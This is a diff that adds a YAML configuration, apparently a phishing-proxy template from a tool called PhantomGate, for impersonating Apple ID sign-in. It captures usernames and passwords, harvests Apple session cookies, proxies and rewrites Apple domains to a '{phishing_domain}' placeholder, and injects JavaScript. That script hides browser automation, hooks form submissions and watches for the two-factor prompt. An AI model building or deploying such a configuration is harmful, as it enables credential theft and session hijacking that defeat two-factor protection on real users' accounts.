@@ -1,0 +1,82 @@
+name: Apple ID
+author: PhantomGate
+version: 2.0.0
+description: Apple ID authentication - Pixel-perfect replica
+
+auth:
+  domains:
+    - appleid.apple.com
+    - idmsa.apple.com
+    - icloud.com
+  
+  login:
+    domain: appleid.apple.com
+    path: /signin
+    username:
+      selector: "input#account_name_text_field"
+      capture: true
+    password:
+      selector: "input#password_text_field"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: X-APPLE-WEBAUTH-TOKEN
+        regex: ".*"
+      - name: X-APPLE-WEBAUTH-USER
+        regex: ".*"
+      - name: X-APPLE-WEBAUTH-SESS
+        regex: ".*"
+      - name: X-APPLE-WEBAUTH-VALIDATE
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: appleid.apple.com
+      inject: true
+    - domain: idmsa.apple.com
+      inject: true
+    - domain: icloud.com
+      inject: true
+  
+  sub_filters:
+    - domain: appleid.apple.com
+      search: "https://appleid.apple.com"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    // PhantomGate Injection - Apple ID
+    (function() {
+      'use strict';
+      
+      // Override navigator properties
+      Object.defineProperty(navigator, 'webdriver', {get: () => false});
+      
+      // Capture form submissions
+      document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var username = form.querySelector('#account_name_text_field');
+        var password = form.querySelector('#password_text_field');
+        if (username && password) {
+          console.log('[PhantomGate] Apple ID credentials captured');
+        }
+      }, true);
+      
+      // Monitor for 2FA prompt
+      var observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+          if (mutation.addedNodes.length) {
+            var node = mutation.addedNodes[0];
+            if (node.nodeType === 1) {
+              var otp = node.querySelector('input[name="otp"]');
+              if (otp) {
+                console.log('[PhantomGate] 2FA prompt detected');
+              }
+            }
+          }
+        });
+      });
+      
+      observer.observe(document.body, {childList: true, subtree: true});
+    })();
